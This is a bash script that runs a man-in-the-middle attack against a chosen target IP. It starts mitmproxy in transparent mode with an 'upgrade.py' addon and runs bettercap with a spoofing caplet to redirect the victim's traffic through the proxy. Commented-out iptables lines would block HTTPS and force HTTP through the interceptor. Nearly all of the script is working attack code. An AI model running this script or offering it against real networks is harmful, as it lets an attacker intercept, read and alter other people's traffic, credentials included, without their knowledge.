#!/bin/bash

read -p "Target IP: " TARGET
read -p "Attack Interface: " INTERFACE
#read -p "Network Interface: " INTERFACE_NET

# block https
#sudo iptables -I FORWARD -p tcp --dport 443 -j DROP

# get ip on interface
#MY_IP=$(ip -4 addr show $INTERFACE_NET | grep -oP '(?<=inet )\d+(\.\d+){3}')
#echo $MY_IP

# redir http to go thru mitmproxy
#sudo iptables -t nat -A PREROUTING -p tcp --dport 80 ! -d $MY_IP -j REDIRECT --to-port 8082

# run mitmproxy
sudo x-terminal-emulator -e "mitmproxy --mode transparent -s upgrade.py --listen-host 0.0.0.0 -p 8082 --ssl-insecure --set block_global=false" & MITM_PID=$!

sed "s/TARGET_PLACEHOLDER/$TARGET/" spoof.cap > /tmp/active.cap
sudo bettercap -caplet /tmp/active.cap -iface $INTERFACE

# cleanup
#sudo iptables -D FORWARD -p tcp --dport 443 -j DROP
#sudo iptables -t nat -D PREROUTING -p tcp --dport 80 ! -d $MY_IP -j REDIRECT --to-port 8082
sudo kill $MITM_PID 2>/dev/null
sudo fuser -k 8082/tcp 2>/dev/null
sudo rm /tmp/active.cap

echo "Done."
echo $MY_IP
